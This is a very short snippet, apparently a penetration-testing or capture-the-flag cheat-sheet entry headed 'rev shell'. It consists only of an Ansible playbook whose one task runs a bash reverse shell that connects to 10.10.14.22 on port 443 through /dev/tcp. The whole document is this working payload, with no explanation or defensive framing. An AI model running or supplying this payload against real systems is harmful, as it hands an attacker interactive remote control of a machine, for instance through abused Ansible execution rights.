### rev shell
```yaml
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
```

